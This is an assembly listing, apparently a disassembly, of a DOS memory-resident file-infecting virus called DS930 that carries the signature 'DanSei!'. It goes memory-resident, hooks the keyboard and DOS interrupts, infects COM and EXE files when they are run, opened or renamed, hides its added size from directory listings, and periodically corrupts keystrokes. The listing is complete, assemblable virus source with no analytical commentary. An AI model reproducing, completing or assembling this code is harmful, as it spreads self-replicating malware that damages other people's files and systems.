
PAGE  59,132

;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
;€€					                                 €€
;€€				DS930	                                 €€
;€€					                                 €€
;€€      Created:			                                 €€
;€€      Passes:    5          Analysis	Options on: none                 €€
;€€					                                 €€
;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€

target		EQU   'T3'                      ; Target assembler: TASM-3.2



; The following equates show data references outside the range of the program.

d_0040_001C_e	equ	1Ch
d_410D_0003_e	equ	3			;*
d_FFC4_03A2_e	equ	3A2h
d_FFC4_03A4_e	equ	3A4h
d_FFC4_03A6_e	equ	3A6h
d_FFC4_03A8_e	equ	3A8h
d_FFC4_03AA_e	equ	3AAh
d_FFC4_03AC_e	equ	3ACh

seg_a		segment	byte public
		assume	cs:seg_a, ds:seg_a


		org	100h

ds930		proc	far

start:
		call	sub_0103

ds930		endp

;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_0103	proc	near
		pop	si
;*		sub	si,3
		db	 83h,0EEh, 03h		;  Fixup - byte match
		cld				; Clear direction
		push	ax
		push	bx
		mov	ax,0ABCDh
		int	21h			; ??int non-standard interrupt
		cmp	ax,0FFFFh
		je	loc_016E		; Jump if equal

                push	si
		push	ds
		push	es

                mov	ax,es
		dec	ax
		mov	es,ax
		mov	bx,d_410D_0003_e
		sub	word ptr es:[bx],3Ch
		dec	bx
		mov	ax,[bx]
		sub	ax,3Ch
		mov	[bx],ax
		mov	es,ax
		push	cs
		pop	ds
		xor	di,di			; Zero register
		mov	cx,3A2h
		rep	movsb			; Rep when cx >0 Mov [si] to es:[di]
		push	es
		pop	ds
		mov	word ptr ds:d_FFC4_03AA_e,0
		mov	byte ptr ds:d_FFC4_03AC_e,0
		mov	ax,3509h
		int	21h			; DOS Services  ah=function 35h
						;  get intrpt vector al in es:bx
		mov	ds:d_FFC4_03A2_e,bx
		mov	ds:d_FFC4_03A4_e,es
		mov	al,21h			; '!'
		int	21h			; DOS Services  ah=function 35h
						;  get intrpt vector al in es:bx
		mov	ds:d_FFC4_03A6_e,bx
		mov	ds:d_FFC4_03A8_e,es
;*		mov	dx,offset l_FFC4_00A1	;*
		db	0BAh,0A1h, 00h		;  Fixup - byte match
		mov	ax,2509h
		int	21h			; DOS Services  ah=function 25h
						;  set intrpt vector al to ds:dx
;*		mov	dx,offset l_FFC4_0118	;*
		db	0BAh, 18h, 01h		;  Fixup - byte match
		mov	al,21h			; '!'
		int	21h			; DOS Services  ah=function 25h
						;  set intrpt vector al to ds:dx
		pop	es
		pop	ds
		pop	si
loc_016E:
		pop	bx
		pop	ax
		add	si,385h
		cmp	word ptr cs:[si],5A4Dh
		je	loc_0182		; Jump if equal
		mov	di,100h
		push	di
		movsw				; Mov [si] to es:[di]
		movsb				; Mov [si] to es:[di]
		retn
loc_0182:
		mov	cx,ds
;*		add	cx,10h
		db	 83h,0C1h, 10h		;  Fixup - byte match
		mov	dx,cx
		add	dx,cs:[si+0Eh]
		cli				; Disable interrupts
		mov	ss,dx
		mov	sp,cs:[si+10h]
		sti				; Enable interrupts
		add	cx,cs:[si+16h]
		push	cx
		push	word ptr cs:[si+14h]
		retf
sub_0103	endp

loc_019f:
			                        ;* No entry point to code
		cmp	[bp+di],si
loc_01a1:       ; int 09
		push	ax
		push	bx
		push	ds
		push	es
		push	cs
		pop	ds
		mov	bx,40h
		mov	es,bx
		mov	bx,d_0040_001C_e
		mov	ax,es:[bx]
		pushf				; Push flags
		call	dword ptr cs:[3A2h]
		cmp	ax,es:[bx]
		je	loc_01FD		; Jump if equal
		cmp	byte ptr ds:[384h],0FFh
		je	loc_01FD		; Jump if equal
		mov	bx,ax
		cmp	byte ptr es:[bx],0
		je	loc_01FD		; Jump if equal
		mov	al,byte ptr ds:[3ACh]
		and	al,al
		jnz	loc_01EC		; Jump if not zero
		inc	word ptr ds:[3AAh]
		cmp	word ptr ds:[3AAh],64h
		nop
		jc	loc_01FD		; Jump if carry Set
		mov	word ptr ds:[3AAh],0
		mov	byte ptr ds:[3ACh],7
		jmp	short loc_01FD
loc_01EC:
		neg	al
		add	al,7
		push	bx
		mov	bx,37Dh
		xlat				; al=[al+[bx]] table
		pop	bx
		mov	es:[bx],al
		dec	byte ptr ds:[3ACh]
loc_01FD:
		pop	es
		pop	ds
		pop	bx
		pop	ax
		iret				; Interrupt return

;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_0202	proc	near
		pushf				; Push flags
		cli				; Disable interrupts
		call	dword ptr cs:[3A6h]
		retn
sub_0202	endp

loc_020A:
		clc				; Clear carry flag
		cli				; Disable interrupts
		jmp	dword ptr cs:[3A6h]
loc_0211:
		mov	ax,0FFFFh
loc_0214:
		clc				; Clear carry flag

loc_ret_0215:
		retf	2

loc_218:;       int 21h
			                        ;* No entry point to code
		sti				; Enable interrupts
		cmp	ax,0ABCDh
		je	loc_0211		; Jump if equal
		cmp	byte ptr cs:[384h],0FFh
		je	loc_020A		; Jump if equal
		cmp	ah,4Eh			; 'N'
		je	loc_0230		; Jump if equal
		cmp	ah,4Fh			; 'O'
		jne	loc_0255		; Jump if not equal
loc_0230:
		call	sub_0202
		jc	loc_ret_0215		; Jump if carry Set
		push	ax
		push	bx
		push	es
                mov     ah,2Fh                  ; get dta es:bx
		call	sub_0202
                test    word ptr es:[bx+18h],8000h      ; date
		jz	loc_0250		; Jump if zero
		sub	word ptr es:[bx+1Ah],3A2h
		sbb	word ptr es:[bx+1Ch],0
loc_0250:
		pop	es
		pop	bx
		pop	ax
		jmp	short loc_0214
loc_0255:
		cmp	ah,11h
		je	loc_025F		; Jump if equal
		cmp	ah,12h
		jne	loc_0286		; Jump if not equal
loc_025F:
		call	sub_0202
		and	al,al
		jnz	loc_ret_0215		; Jump if not zero
		push	ax
		push	bx
		push	es
		mov	ah,2Fh			; '/'
		call	sub_0202
		test	word ptr es:[bx+20h],8000h
		jz	loc_0281		; Jump if zero
		sub	word ptr es:[bx+24h],3A2h
		sbb	word ptr es:[bx+26h],0
loc_0281:
		pop	es
		pop	bx
		pop	ax
		jmp	short loc_0214
loc_0286:
		cmp	ax,4B00h
		je	loc_029A		; Jump if equal
		cmp	ah,3Dh			; '='
		je	loc_029A		; Jump if equal
		cmp	ah,43h			; 'C'
		je	loc_029A		; Jump if equal
		cmp	ah,56h			; 'V'
		jne	loc_02A2		; Jump if not equal
loc_029A:
		call	sub_02A5
		jnz	loc_02A2		; Jump if not zero
		call	sub_02EA
loc_02A2:
		jmp	loc_020A

;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹


sub_02A5	proc	near
		push	ax
		push	si
		mov	si,dx
		cld				; Clear direction
loc_02AA:
		lodsb				; String [si] to al
		and	al,al
		jz	loc_02E6		; Jump if zero
		cmp	al,2Eh			; '.'
		jne	loc_02AA		; Jump if not equal
		mov	ax,[si-9]
		and	ax,0DFDFh
		cmp	ax,4941h
		je	loc_02E6		; Jump if equal
		mov	ax,[si-5]
		and	ax,0DFDFh
		cmp	ax,4353h
		je	loc_02E6		; Jump if equal
		lodsw				; String [si] to ax
		and	ax,0DFDFh
		cmp	ax,4F43h
		jne	loc_02D9		; Jump if not equal
		lodsb				; String [si] to al
		and	al,0DFh
		cmp	al,4Dh			; 'M'
		jmp	short loc_02E3
loc_02D9:
		cmp	ax,5845h
		jne	loc_02E3		; Jump if not equal
		lodsb				; String [si] to al
		and	al,0DFh
		cmp	al,45h			; 'E'
loc_02E3:
		pop	si
		pop	ax
		retn
loc_02E6:
		inc	al
		jmp	short loc_02E3
sub_02A5	endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_02EA	proc	near
		push	ax
		push	bx
		push	cx
		push	dx
		push	si
		push	ds
		push	es
		mov	ax,3524h
		call	sub_0202
		push	bx
		push	es

		push	dx
		push	ds
		push	cs
		pop	ds
		mov	dx,37Ah
		mov	ax,2524h
		call	sub_0202
		pop	ds
		pop	dx

		mov	si,dx
                mov     ax,121Ah                ; Get disk al of DS:SI file
		int	2Fh			; DOS Internal services
						;*  undocumented function
		mov	byte ptr cs:[3B1h],al
		mov	ax,4300h
		call	sub_0202
		jc	loc_034A		; Jump if carry Set
		test	cl,1Ch
		jnz	loc_034A		; Jump if not zero
		push	cx
		xor	cx,cx			; Zero register

                mov	ax,4301h
		call	sub_0202
		jc	loc_035A		; Jump if carry Set

                mov	ax,3D02h
		call	sub_0202
		jc	loc_0343		; Jump if carry Set

                mov	bx,ax
		push	dx
		push	ds
		push	cs
		pop	ds
		call	sub_035D
		pop	ds
		pop	dx
		mov	ah,3Eh			; '>'
		call	sub_0202
loc_0343:
		pop	cx
		mov	ax,4301h
		call	sub_0202
loc_034A:
		pop	ds
		pop	dx
		mov	ax,2524h
		call	sub_0202
		pop	es
		pop	ds
		pop	si
		pop	dx
		pop	cx
		pop	bx
		pop	ax
		retn
loc_035A:
		pop	cx
		jmp	short loc_034A
sub_02EA	endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_035D	proc	near
                mov     ax,5700h               ; get date,1
		call	sub_0202
		mov	word ptr ds:[3ADh],dx
		mov	word ptr ds:[3AFh],cx
		mov	cx,0FFFFh
		mov	dx,0FFFFh
		mov	ax,4202h
		call	sub_0202
		mov	dx,385h
		mov	cx,1
		mov	ah,3Fh			; '?'
		call	sub_0202
		cmp	byte ptr ds:[385h],26h	; '&'
		jne	loc_038C		; Jump if not equal
		jmp	loc_0461
loc_038C:
		push	bx
		mov	dl,byte ptr ds:[3B1h]
                mov     ah,36h                  ; Get Free Space
		call	sub_0202
                xchg	bx,ax
		mul	bx			; dx:ax = reg * ax
		pop	bx
		and	dx,dx
		jnz	loc_03A4		; Jump if not zero
		cmp	ax,2
		jae	loc_03A4		; Jump if above or =
		retn
loc_03A4:
		xor	cx,cx			; Zero register
		xor	dx,dx			; Zero register
		mov	ax,4200h
		call	sub_0202
		mov	dx,385h
		mov	cx,1Ch
		mov	ah,3Fh			; '?'
		call	sub_0202
		jc	loc_ret_03D7		; Jump if carry Set
		xor	cx,cx			; Zero register
		xor	dx,dx			; Zero register
		mov	ax,4202h
		call	sub_0202
		cmp	word ptr ds:[385h],5A4Dh
		je	loc_03D8		; Jump if equal
		cmp	ax,400h
		jb	loc_ret_03D7		; Jump if below
		cmp	ax,0F000h
		jbe	loc_03EE		; Jump if below or =

loc_ret_03D7:
		retn
loc_03D8:
		push	ax
		push	dx
		mov	cx,200h
		div	cx			; ax,dx rem=dx:ax/reg
		inc	ax
		cmp	ax,word ptr ds:[389h]
		jne	loc_03EA		; Jump if not equal
		cmp	dx,word ptr ds:[387h]
loc_03EA:
		pop	dx
		pop	ax
		jnz	loc_ret_03D7		; Jump if not zero
loc_03EE:
		push	ax
		push	dx
		xor	dx,dx			; Zero register
		mov	cx,3A2h
		mov	ah,40h			; '@'
		call	sub_0202
		pop	dx
		pop	ax
		jc	loc_ret_03D7		; Jump if carry Set
		cmp	word ptr ds:[385h],5A4Dh
		je	loc_0413		; Jump if equal
		mov	byte ptr ds:[385h],0E9h
		sub	ax,3
		mov	word ptr ds:[386h],ax
		jmp	short loc_044C
loc_0413:
		push	ax
		push	dx
		add	ax,3A2h
;*		adc	dx,0
		db	 83h,0D2h, 00h		;  Fixup - byte match
		mov	cx,200h
		div	cx			; ax,dx rem=dx:ax/reg
		inc	ax
		mov	word ptr ds:[389h],ax
		mov	word ptr ds:[387h],dx
		pop	dx
		pop	ax
		mov	si,word ptr ds:[38Dh]
		mov	cl,4
		shl	si,cl			; Shift w/zeros fill
		sub	ax,si
;*		sbb	dx,0
		db	 83h,0DAh, 00h		;  Fixup - byte match
		mov	cx,10h
		div	cx			; ax,dx rem=dx:ax/reg
		mov	word ptr ds:[39Bh],ax
		mov	word ptr ds:[399h],dx
		mov	word ptr ds:[393h],ax
		mov	word ptr ds:[395h],1000h
loc_044C:
		xor	cx,cx			; Zero register
		xor	dx,dx			; Zero register
		mov	ax,4200h
		call	sub_0202
		mov	dx,385h
		mov	cx,1Ch
		mov	ah,40h			; '@'
		call	sub_0202
loc_0461:
		mov	dx,word ptr ds:[3ADh]
		mov	cx,word ptr ds:[3AFh]
		test	dx,8000h
		jnz	loc_0473		; Jump if not zero
		add	dx,0C800h
loc_0473:
		mov	ax,5701h
		call	sub_0202
		retn
sub_035D	endp

			                        ;* No entry point to code
; int 24h
		mov	al,3
		iret				; Interrupt return
			                        ;* No entry point to code
                db      'DanSei!'
		db	 00h,0CDh
		db	20h
		db	26 dup (0)
		db	26h

seg_a		ends



		end	start
